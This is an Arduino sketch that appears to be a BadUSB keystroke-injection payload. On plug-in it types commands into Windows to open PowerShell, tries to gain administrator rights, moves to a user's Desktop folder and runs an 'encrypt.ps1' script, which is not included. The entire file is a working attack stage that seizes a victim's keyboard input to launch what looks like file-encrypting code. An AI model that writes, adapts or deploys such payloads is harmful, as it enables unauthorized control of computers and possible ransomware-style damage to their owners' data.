#include <Keyboard.h>

void setup() {
  // Start the keyboard
  Keyboard.begin();
  delay(2000);  // Delay to give you time to focus on the text editor

  // Open Run dialog (Windows+R)
  Keyboard.press(KEY_LEFT_GUI); // Left Windows key
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500); // Wait for the Run dialog to open

  // Type "powershell" and press Enter
  Keyboard.print("powershell");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // Press Ctrl+Shift+Enter to run PowerShell as administrator
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  // Wait for PowerShell to start (adjust the delay based on your system's performance)
  delay(2000);
  Keyboard.print("cd C:\\Users\\CRS\\Desktop ");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  // Type the encryption command using powershell
  // Use double backslashes or a single forward slash to avoid escape character issues
  Keyboard.print(".\\encrypt.ps1");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  // End the keyboard
  Keyboard.end();
}

void loop() {
  // Nothing to do in the loop
}
